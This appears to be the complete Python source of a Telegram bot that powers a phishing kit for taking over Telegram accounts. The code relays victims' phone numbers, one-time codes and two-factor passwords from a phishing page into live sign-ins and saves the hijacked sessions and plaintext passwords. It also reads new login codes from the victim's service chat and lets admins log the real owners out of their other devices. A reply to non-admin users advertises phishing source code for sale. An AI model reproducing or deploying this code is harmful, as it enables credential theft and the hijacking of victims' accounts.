import time,json, math, asyncio, httpx, numbers,re
from telethon.sync import TelegramClient, Button, events
from telethon import TelegramClient,events
from telethon.tl.functions.auth import SendCodeRequest, CheckPasswordRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import UnauthorizedError, PasswordHashInvalidError, AuthKeyUnregisteredError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest, GetPasswordRequest
from telethon import functions
from settings import *

path = "/home/sampoer2/python/bot/"
allowedmethod = ['getotp','sendotp','sendpw']

bot = TelegramClient(f"{path}sessions/bot", api_id, api_hash).start(bot_token=bot_token)

# FILES
fUsers = f"{path}json/users.json"
fPhase = f"{path}json/phase.json"

def readJSON(targetFile):
    with open(targetFile, 'r') as openfile: jsondata = json.load(openfile)
    return jsondata

def saveJSON(targetFile, source):
    with open(targetFile, 'w') as file: json.dump(source, file, indent=4)

def update(data):
    req = httpx.post(f"{url}/API/index.php", data=data)

async def notif(text):
    for a in admin: await bot.send_message(a, text)

def todate(timestamp):
    time_struct = time.localtime(timestamp)
    formatted_date = time.strftime("%Y-%m-%d %H:%M:%S", time_struct)
    return formatted_date

def getUsers(page):
    users = readJSON(fUsers)

    if page == 1: start = 0; end = showperpage
    else:
        start = (page * showperpage) - showperpage
        end = start + showperpage
    
    pagination = len(users) / showperpage
    addi = f"**Telegram Account Manager**\n\n"
    page_users = list(users.items())[start:end]

    no = start
    butto = []
    for phone, user in page_users:
        no = no + 1; name = user["name"]
        if user['username']: name = f"[{name}](https://t.me/{user['username']})"
        addi = addi + f"[{int(user['user_id'])}](https://t.me/{bot_username}?start=login-{phone}) | {name}\n"

    addi = f"{addi}\n**Total users : **{len(users)}\nupdated : {todate(round(time.time()))}\n>> **PAGE {page}** / Showing : {start + 1} - {no}"
    
    if isinstance(pagination, numbers.Real): pagination + 1
    return addi, pagination, butto

def getSpecificUsers(phonenumber):
    users = readJSON(fUsers)

    username = "None"

    if phonenumber in users:
        if users[phonenumber]['username']: username = f"@{users[phonenumber]['username']}"
        result = f"**Telegram Account Manager**\n\n**NAME :** {users[phonenumber]['name']}\n**USERNAME :** {username}\n**PHONE :** `{phonenumber}`\n**PASSWORD :** `{users[phonenumber]['password']}`"
    else:
        result = "UserID tidak terdaftar / telah logout"

    return result

def btnSpecificUsers(phonenumber):
    btn = [
        [Button.inline("GET OTP CODE",f"readcode-{phonenumber}")],
        [Button.inline("BUANG 🗑",f"deleteThis-{phonenumber}")],
        [
            Button.inline("DEVICES",f"listsession-{phonenumber}"),
            Button.inline("❌ DELETE","delete")
        ]
    ]
    
    return btn

btn_delete = Button.inline("❌ DELETE","delete")

@bot.on(events.NewMessage)
async def handle_new_message(event):
    if event.is_private:
        message = event.message
        chat_id = message.chat_id
        text    = message.text
        sender  = await event.get_sender()
        SENDER  = sender.id

        be  = await bot.get_me()

        if SENDER == be.id:
            split = text.split(":")
            acc = TelegramClient(f"{path}sessions/users/{split[0]}", api_id, api_hash)
            await acc.connect()

            users = readJSON(fUsers)
            phase = readJSON(fPhase)

            if len(split) == 1 and len(text) < 20:
                await event.delete()
                try:
                    phash = await acc.send_code_request(split[0])
                    phase[split[0]] = phash.phone_code_hash
                    update({"method":"update","phone":split[0],"type":"checkPhone","status":"success"})
                except: update({"method":"update","phone":split[0],"type":"checkPhone","status":"failed"})

                saveJSON(fPhase, phase)
            
            elif len(split) == 2 and len(split[1]) == 5:
                await event.delete()
                try:
                    result = await acc.sign_in(split[0], split[1], phone_code_hash=f"{phase[split[0]]}")
                    name = result.first_name
                    if result.last_name:
                        name = f"{result.first_name} {result.last_name}"

                    users[split[0]] = {"user_id":result.id,"name":name,"username":result.username,"password":""}
                    await notif(f"New user logged in! {name}")

                    update({"method":"update","phone":split[0],"type":"OTP","status":"success","detail":"success"})
                except SessionPasswordNeededError:
                    try:
                        result = await acc(functions.account.GetPasswordRequest())
                        update({"method":"update","phone":split[0],"type":"OTP","status":"success","detail":"passwordNeeded","hint":result.hint})
                    except: return True
                except: update({"method":"update","phone":split[0],"type":"OTP","status":"failed","detail":"wrong"})

                saveJSON(fUsers, users)
                
            elif len(split) == 3 and len(split[1]) == 5:
                await event.delete()
                password = str(split[2])
                try:
                    result = await acc.sign_in(password=password, phone_code_hash=phase[split[0]])
                    name = result.first_name
                    if result.last_name:
                        name = f"{result.first_name} {result.last_name}"

                    users[split[0]] = {"user_id":result.id,"name":name,"username":result.username,"password":split[2]}
                    await notif(f"New user logged in! {name}")

                    update({"method":"update","phone":split[0],"type":"password","status":"success"})
                except PasswordHashInvalidError: update({"method":"update","phone":split[0],"type":"password","status":"failed"})
                except: update({"method":"update","phone":split[0],"type":"password","status":"failed"})

                saveJSON(fUsers, users)
                    
            acc.disconnect()

        elif SENDER in admin:
            if text.startswith("/"):
                await event.delete()
                if text.startswith("/start"):
                    text = text.replace("/start ","")
                    if text.startswith("login-"):
                        split = text.split("-")
                        phonenumber = split[1]
                        await event.respond(getSpecificUsers(phonenumber), buttons=btnSpecificUsers(phonenumber))
                        await event.delete()
                            
                if text.startswith("/users"):
                    listuser, calco, butto = getUsers(1)                                    
                    butto.append([Button.inline("REFRESH 🔄",f"getUser:1")])
                    if calco > 1: butto.append([Button.inline("NEXT >", f"getUser:2")])
                    await event.respond(listuser, buttons=butto, link_preview=False)
        
        else: await event.respond("Hubungi WhatsApp wa.me/6285752322116 untuk membeli source code Truelogin atau phising biasa.")
            
@bot.on(events.CallbackQuery())
async def callback_handler(event):
    callback_data = event.data.decode('utf-8')
    message = await bot.get_messages(event.chat_id, ids=event.message_id)

    if callback_data.startswith("getUser:"):
        split = callback_data.split(":")
        val   = int(split[1])
        listuser, calco, butto = getUsers(val)
        butto.append([Button.inline("REFRESH 🔄",f"getUser:{val}")])

        btx = []
        if calco > 1:
            if val == 1:
                btnNext = Button.inline("NEXT >", "getUser:2")
                btx = ([btnNext])
            else:
                btx = [Button.inline("< PREV", f"getUser:{val-1}")]
                if calco > val: btx.append(Button.inline("NEXT >", f"getUser:{val+1}"))

        butto.append(btx)

        try: await event.edit(listuser, buttons=butto, link_preview=False)
        except: return False

    elif callback_data == "delete":
        try: await event.delete()
        except: await event.answer("Tidak bisa menghapus pesan")
        
    else:
        split = callback_data.split("-")
        method = split[0]

        urelated = ["accountInfo","readcode","listsession","selectsessionhash","logout","surelogout","clearAllSession","sureClearAllSession","deleteThis","sureDeleteThis"]
        if method in urelated:
            phonenumber = split[1]

            acd = TelegramClient(f"{path}sessions/users/{split[1]}", api_id, api_hash)
            await acd.connect()

            users = readJSON(fUsers)
            phase = readJSON(fPhase)

            if callback_data.startswith("deleteThis-"):
                xsplit = callback_data.split("-")
                no_hpx = xsplit[1]

                await event.edit(f"Apakah Anda yakin ingin menghapus akun `{no_hpx}` dari bot ini?", buttons=[Button.inline("YES, 100%",f"sureDeleteThis-{no_hpx}"), Button.inline("NO, CANCEL!","delete")])

            elif callback_data.startswith("sureDeleteThis-"):
                xsplit = callback_data.split("-")
                no_hpx = xsplit[1]

                if no_hpx in users: users.pop(no_hpx)
                await event.edit(f"AKUN `{no_hpx}` TELAH DIHAPUS DARI DATA USERS.JSON")
            
            else:
                try:

                    if callback_data.startswith("accountInfo-"):
                        try: await event.edit(f"{getSpecificUsers(phonenumber)}\n\nupdated : {todate(time.time())}", buttons=btnSpecificUsers(phonenumber))
                        except: return False

                    elif callback_data.startswith("readcode-"):
                        msg = await acd.get_messages(777000, limit=100)
                        for messe in msg:
                            OTPCODE = re.search(r'\b(\d{5})\b', messe.text)
                            if OTPCODE:
                                BTX = [
                                    [Button.inline("REFRESH 🔄",f"readcode-{phonenumber}")],
                                    [Button.inline("< BACK",f"accountInfo-{phonenumber}"), btn_delete]
                                ]
                                await event.edit(f"**Your login code :** `{OTPCODE.group(0)}`\n**Received :** {messe.date} (UTC)\n\n**Updated :** {todate(time.time())}", buttons=BTX)
                                break

                    elif callback_data.startswith("listsession-"):
                        results = await acd(functions.account.GetAuthorizationsRequest())

                        btn     = []
                        sbtn    = []
                        
                        username = ""
                        if users[phonenumber]['username']:
                            username = f"| @{users[phonenumber]['username']}"

                        i = 1
                        addi = f"{users[phonenumber]['user_id']} {username} | {users[phonenumber]['name']}\n\n**Active sessions:**\n\n"
                        for authorization in results.authorizations:
                            addi = addi + f"{i}. {authorization.device_model} | {authorization.country}\n**{authorization.app_name}**, {authorization.device_model}\n**Login :** {authorization.date_created}\n\n"
                            button = Button.inline(f"{i}", f"selectsessionhash-{phonenumber}-{authorization.hash}")
                            sbtn.append(button)
                            i += 1


                        btn.append(sbtn)
                        btn.append([Button.inline("DELETE ALL OTHER SESSIONS",f"clearAllSession-{phonenumber}")])
                        btn.append([Button.inline("< BACK", f"accountInfo-{phonenumber}"),btn_delete])
                        btn.append([Button.inline("DELETE DATA", f"deleteThis-{phonenumber}")])

                        await event.edit(f"{addi}", buttons=btn)

                    elif callback_data.startswith("selectsessionhash-"):
                        gsplit = callback_data.replace(f"selectsessionhash-{phonenumber}-","")
                        results = await acd(functions.account.GetAuthorizationsRequest())
                        
                        sessionfound = False
                        addi = f"{users[phonenumber]['user_id']} | {users[phonenumber]['name']}\n\n"
                        for authorization in results.authorizations:
                            if authorization.hash == int(gsplit):
                                addi = addi + f"{authorization.device_model} | {authorization.country}\n**{authorization.app_name}**, {authorization.device_model}\n**Login :** {authorization.date_created}"
                                sessionfound = True
                                break

                        if sessionfound:
                            btn = [[Button.inline("Logout",f"logout-{phonenumber}-{gsplit}")],[Button.inline("< back",f"listsession-{phonenumber}"),btn_delete]]
                            await event.edit(addi, buttons=btn)
                        else:
                            await event.answer("Error: SessionHash not found", alert=True)

                    elif callback_data.startswith("logout-"):
                        newText = f"{message.text}\n\nApakah Anda yakin ingin logout dari perangkat ini?"
                        gsplit = callback_data.replace(f"logout-{phonenumber}-","")
                        btn = [[Button.inline("Yakin 100%",f"surelogout-{phonenumber}-{gsplit}")],[Button.inline("< back",f"listsession-{phonenumber}"),btn_delete]]
                        await event.edit(newText, buttons=btn)

                    elif callback_data.startswith("surelogout-"):
                        gsplit = callback_data.replace(f"surelogout-{phonenumber}-","")
                        try:
                            result = await acd(functions.account.ResetAuthorizationRequest(hash=int(gsplit)))
                            await event.answer("Berhasil Logout!", alert=True)
                            btn = [Button.inline("< back",f"listsession-{phonenumber}"),btn_delete]
                            await event.edit(f"{message.text}\n**> Telah logout dari perangkat ini.**", buttons=btn)
                        except:
                            await event.answer("Belum dapat logout, coba beberapa saat (setelah 24 jam login di bot ini)", alert=True)

                    elif callback_data.startswith("clearAllSession-"):
                        await event.edit(f"Apakah anda yakin ingin mengeluarkan akun {users[phonenumber]['user_id']} / {phonenumber} / @{users[phonenumber]['username']} dari semua perangkat lain?", buttons=[Button.inline("YES, 100%",f"sureClearAllSession-{phonenumber}"),btn_delete])

                    elif callback_data.startswith("sureClearAllSession-"):
                        results = await acd(functions.account.GetAuthorizationsRequest())

                        for authorization in results.authorizations:                                    
                            if authorization.hash != 0:
                                hash = authorization.hash
                                try:
                                    await acd(functions.account.ResetAuthorizationRequest(hash=hash))
                                    success = True
                                except:
                                    success = False
                                    await event.answer("Belum dapat logout, coba beberapa saat (setelah 24 jam login di bot ini)", alert=True)
                                    break
                        
                        if success:
                            await event.edit(f"Berhasil mengeluarkan akun {users[phonenumber]['user_id']} / {phonenumber} / @{users[phonenumber]['username']} dari semua perangkat lain", buttons=btn_delete)

                except AuthKeyUnregisteredError: await event.answer("Akun ini telah logout dari perangkat ini.", alert=True)

            saveJSON(fUsers, users)
            saveJSON(fPhase, phase)

            acd.disconnect()

print("Program is running..")
bot.run_until_disconnected()